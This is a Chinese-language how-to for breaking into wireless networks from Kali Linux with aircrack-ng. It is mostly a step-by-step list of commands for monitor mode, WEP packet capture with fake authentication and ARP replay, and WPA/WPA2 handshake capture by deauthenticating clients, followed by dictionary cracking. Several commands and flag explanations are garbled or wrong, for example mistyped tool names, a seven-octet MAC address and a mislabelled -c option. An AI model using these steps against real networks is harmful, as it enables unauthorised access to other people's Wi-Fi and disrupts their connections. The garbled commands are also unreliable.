配置环境 
路由器        目标
kali Linux    攻击源

1.启动 kali

2. ifconfig 查看无线网卡

3.扫描网线网络 iwlist wlan0 scan (这里扫描是 wlan0 具体看自己网线网卡是哪一个

4.使用 airmon -ng  check检查受影响的程序

5.使用 airmon -ng  check kill     ( kill掉受影响的进程)

6.使用 airmon -ng  start  wlan0 (开启wlan0网卡进去监听模式)

7.抓取数据包
  1）使用使用 airmon -ng  转储数据包 airmon -ng  mon0 --channel 6(信道看自己的，不一定是6有可能是7)
2）使用 airodump -ng 抓取wep加密数据
命令如下
airodump -ng  -w book mon0 --channel 6
3）使用aireplay -ng进行虚假身份验证
命令如下
aireplay -ng -1 o -e ck -a 00-00-00-00-00-00 -h 03-23-69-55-33-22 
这里参数注释
-a 指定身份认证接入点mac地址
-h 自身网卡mac地址
-l 告诉aireplay -ng我需要进行虚假身份认证
-e  指定无线ssid  我的是 ck
0  重传时间
mon0 虚假身份认证所用的接口
4）使用aireplay -ng重新广播arp数据包
命令如下
aireplay -ng -3 -b 00-00-00-00-00-00-00 -h 03-23-69-55-33-22 mon0
参数注释 
- 3  进行arp请求重复攻击
- b   指定基站mac 也就是目标路由器mac
- h 自身网卡地址
mon0  网络接口 

8.密码破解
1）破解wep密码
命令如下
aircrack-ng -b 00-00-00-00-00-00 pass word. cap
参数注释
-b    目标路由地址
password. cap   抓取的数据包文件

2）wpa/ wpa2密码
使用airodump -ng 破解wpa2
命令如下
airodump -ng -c 6 --bssid 00-00-00-00-00-00 -w password mon0
参数注释
- c 指定特定信道
- w 抓取数据包写入password
 6 信道
-bssid 目标mac(路由器mac)
-mon0  网络接口 
向客户端发送取消验证请求
命令如下
aireplay -ng -0 1 -a 00-00-00-00-00-00  -c 03-23-69-55-33-22 mon0
参数注释
-mon0  网络接口 
0 解除验证
1 发送解除验证的数量
00-00-00-00-00-00  目标路由地址
03-23-69-55-33-22 自己网卡地址 
-c  指定特定信道
使用aircrack-ng 破解出wpa2密码
命令如下
aircrack-ng -w password. lst -b 00-00-00-00-00-00 -password. cap
参数注释
-w 指定密码字典 我这里是password
-b 指定目标无线路由mac
pass word. cap 则是我能抓的数据包

9.接下来坐等破解出来的无线密码(密码能不能破解关键在于你的密码字典够不够强大)
